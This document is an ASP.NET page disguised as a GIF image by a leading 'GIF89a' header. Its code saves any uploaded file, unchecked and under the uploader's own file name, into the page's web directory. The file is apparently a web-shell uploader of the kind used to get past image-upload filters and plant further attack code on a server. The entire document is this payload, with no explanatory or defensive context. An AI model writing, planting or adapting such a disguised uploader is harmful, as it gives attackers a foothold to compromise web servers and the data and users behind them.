GIF89a
<%@ Page Language="C#" %>
<%@ Import Namespace="System.IO" %>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<script runat="server">

protected void uploadFile_Click(object sender, EventArgs e) {  
    if (UploadImages.HasFiles) {  
        foreach(HttpPostedFile uploadedFile in UploadImages.PostedFiles) {  
            uploadedFile.SaveAs(System.IO.Path.Combine(Server.MapPath("."), uploadedFile.FileName));  
            listofuploadedfiles.Text += String.Format("{0}<br />", uploadedFile.FileName);  
        }  
    }  
}

</script>

<html xmlns="http://www.w3.org/1999/xhtml" >
<head runat="server">
<title>upload</title>
</head>
<body>
<form id="form1" runat="server">
<div>  
   <asp:FileUpload runat="server" ID="UploadImages" AllowMultiple="true" />  
   <asp:Button runat="server" ID="uploadedFile" Text="Upload" OnClick="uploadFile_Click" />  
   <asp:Label ID="listofuploadedfiles" runat="server" />  
</div>
</form>
</body>
</html>

